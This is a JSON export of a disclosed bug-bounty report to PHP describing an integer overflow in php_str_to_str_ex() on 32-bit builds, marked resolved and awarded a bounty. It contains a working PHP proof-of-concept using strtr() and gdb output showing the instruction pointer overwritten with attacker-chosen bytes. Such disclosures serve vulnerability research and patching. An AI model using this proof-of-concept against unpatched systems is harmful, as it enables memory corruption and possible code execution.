{"id":113122,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTMxMjI=","url":"https://hackerone.com/reports/113122","title":"An integer overflow bug in php_str_to_str_ex() led arbitrary code execution.","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-27T22:01:37.826Z","submitted_at":"2016-01-27T22:01:37.826Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"blue9057","url":"/blue9057","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:37:53.176Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:37:52.280Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n------------------\n\nAn integer overflow vulnerability exists in PHP-7.1.0\ndue to missing check of size before calling\nzend_string_alloc() in ext/standard/string.c:3234.\n\nCode:\nnew_str = zend_string_alloc(count * (str_len - needle_len) + ZSTR_LEN(haystack), 0);\n\nAll variables including str_len, needle_len, count, haystack are fully controllable.\nThe overflow results as arbitrary code execution,\nas running of test script alter %eip to the arbitrary values.\n\nThis bug is only triggered in 32bit machine.\n\nTest script\n-------------------\n\u003c?php\n   $a = str_repeat('A', 65536);\n   $b = str_repeat('ABCD', 32768);\n   // Changing 'ABCD' into other value alters %eip to arbitrary value.\n   $c = array('AA'=\u003e $b);\n   strtr($a , $c);\n?\u003e\n\nExpected result\n------------------------\nCorrect execution of strtr() function.\n\nActual result\n--------------------\n[blue9057@ubuntu ~/exploit/php$] gdb `which php`\nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1\nCopyright (C) 2014 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i686-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from /usr/local/bin/php...done.\n(gdb) r strtr.php\nStarting program: /usr/local/bin/php strtr.php\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x44434241 in ?? ()\n(gdb) i r\neax            0x0\t0\necx            0xb7a75000\t-1213771776\nedx            0xb7a130f0\t-1214172944\nebx            0x1\t1\nesp            0xbfffc01c\t0xbfffc01c\nebp            0xbfffc0b4\t0xbfffc0b4\nesi            0xb7a13020\t-1214173152\nedi            0xb7a741c0\t-1213775424\neip            0x44434241\t0x44434241\neflags         0x10286\t[ PF SF IF RF ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n(gdb) r -v\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /usr/local/bin/php -v\nPHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )\nCopyright (c) 1997-2016 The PHP Group\nZend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies\n[Inferior 1 (process 4169) exited normally]\n\nEIP is controlled as 0x44434241 with the PoC code placed above, from the input \"ABCD\".\nThe attacker can jmp to arbitrary address by controlling that value.\n\n\nThe bug is reported to PHP, and patched \u0026 closed; reference is here:\nhttps://bugs.php.net/bug.php?id=71450\n","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eAn integer overflow vulnerability exists in PHP-7.1.0\u003cbr\u003e\ndue to missing check of size before calling\u003cbr\u003e\nzend_string_alloc() in ext/standard/string.c:3234.\u003c/p\u003e\n\n\u003cp\u003eCode:\u003cbr\u003e\nnew_str = zend_string_alloc(count * (str_len - needle_len) + ZSTR_LEN(haystack), 0);\u003c/p\u003e\n\n\u003cp\u003eAll variables including str_len, needle_len, count, haystack are fully controllable.\u003cbr\u003e\nThe overflow results as arbitrary code execution,\u003cbr\u003e\nas running of test script alter %eip to the arbitrary values.\u003c/p\u003e\n\n\u003cp\u003eThis bug is only triggered in 32bit machine.\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n   $a = str_repeat(\u0026#39;A\u0026#39;, 65536);\u003cbr\u003e\n   $b = str_repeat(\u0026#39;ABCD\u0026#39;, 32768);\u003cbr\u003e\n   // Changing \u0026#39;ABCD\u0026#39; into other value alters %eip to arbitrary value.\u003cbr\u003e\n   $c = array(\u0026#39;AA\u0026#39;=\u0026gt; $b);\u003cbr\u003e\n   strtr($a , $c);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"expected-result\"\u003eExpected result\u003c/h2\u003e\n\n\u003cp\u003eCorrect execution of strtr() function.\u003c/p\u003e\n\n\u003ch2 id=\"actual-result\"\u003eActual result\u003c/h2\u003e\n\n\u003cp\u003e[blue9057@ubuntu ~/exploit/php$] gdb \u003ccode\u003ewhich php\u003c/code\u003e\u003cbr\u003e\nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1\u003cbr\u003e\nCopyright (C) 2014 Free Software Foundation, Inc.\u003cbr\u003e\nLicense GPLv3+: GNU GPL version 3 or later \u003ca title=\"http://gnu.org/licenses/gpl.html\" href=\"/redirect?url=http%3A%2F%2Fgnu.org%2Flicenses%2Fgpl.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gnu.org/licenses/gpl.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThis is free software: you are free to change and redistribute it.\u003cbr\u003e\nThere is NO WARRANTY, to the extent permitted by law.  Type \u0026quot;show copying\u0026quot;\u003cbr\u003e\nand \u0026quot;show warranty\u0026quot; for details.\u003cbr\u003e\nThis GDB was configured as \u0026quot;i686-linux-gnu\u0026quot;.\u003cbr\u003e\nType \u0026quot;show configuration\u0026quot; for configuration details.\u003cbr\u003e\nFor bug reporting instructions, please see:\u003cbr\u003e\n\u003ca title=\"http://www.gnu.org/software/gdb/bugs/\" href=\"/redirect?url=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fbugs%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.gnu.org/software/gdb/bugs/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nFind the GDB manual and other documentation resources online at:\u003cbr\u003e\n\u003ca title=\"http://www.gnu.org/software/gdb/documentation/\" href=\"/redirect?url=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdocumentation%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.gnu.org/software/gdb/documentation/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nFor help, type \u0026quot;help\u0026quot;.\u003cbr\u003e\nType \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;...\u003cbr\u003e\nReading symbols from /usr/local/bin/php...done.\u003cbr\u003e\n(gdb) r strtr.php\u003cbr\u003e\nStarting program: /usr/local/bin/php strtr.php\u003c/p\u003e\n\n\u003cp\u003eProgram received signal SIGSEGV, Segmentation fault.\u003cbr\u003e\n0x44434241 in ?? ()\u003cbr\u003e\n(gdb) i r\u003cbr\u003e\neax            0x0  0\u003cbr\u003e\necx            0xb7a75000   -1213771776\u003cbr\u003e\nedx            0xb7a130f0   -1214172944\u003cbr\u003e\nebx            0x1  1\u003cbr\u003e\nesp            0xbfffc01c   0xbfffc01c\u003cbr\u003e\nebp            0xbfffc0b4   0xbfffc0b4\u003cbr\u003e\nesi            0xb7a13020   -1214173152\u003cbr\u003e\nedi            0xb7a741c0   -1213775424\u003cbr\u003e\neip            0x44434241   0x44434241\u003cbr\u003e\neflags         0x10286  [ PF SF IF RF ]\u003cbr\u003e\ncs             0x73 115\u003cbr\u003e\nss             0x7b 123\u003cbr\u003e\nds             0x7b 123\u003cbr\u003e\nes             0x7b 123\u003cbr\u003e\nfs             0x0  0\u003cbr\u003e\ngs             0x33 51\u003cbr\u003e\n(gdb) r -v\u003cbr\u003e\nThe program being debugged has been started already.\u003cbr\u003e\nStart it from the beginning? (y or n) y\u003cbr\u003e\nStarting program: /usr/local/bin/php -v\u003cbr\u003e\nPHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )\u003cbr\u003e\nCopyright (c) 1997-2016 The PHP Group\u003cbr\u003e\nZend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies\u003cbr\u003e\n[Inferior 1 (process 4169) exited normally]\u003c/p\u003e\n\n\u003cp\u003eEIP is controlled as 0x44434241 with the PoC code placed above, from the input \u0026quot;ABCD\u0026quot;.\u003cbr\u003e\nThe attacker can jmp to arbitrary address by controlling that value.\u003c/p\u003e\n\n\u003cp\u003eThe bug is reported to PHP, and patched \u0026amp; closed; reference is here:\u003cbr\u003e\n\u003ca title=\"https://bugs.php.net/bug.php?id=71450\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D71450\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=71450\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:37:52.395Z","allow_singular_disclosure_after":-35663954.00611324,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":935032,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-01T00:21:25.805Z","updated_at":"2016-05-01T00:21:25.805Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"blue9057","url":"/blue9057"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935033,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-01T00:21:31.119Z","updated_at":"2016-05-01T00:21:31.119Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"blue9057","url":"/blue9057"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026469,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:37:52.300Z","updated_at":"2019-10-13T09:37:52.300Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285861,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:37:53.198Z","updated_at":"2019-11-12T09:37:53.198Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}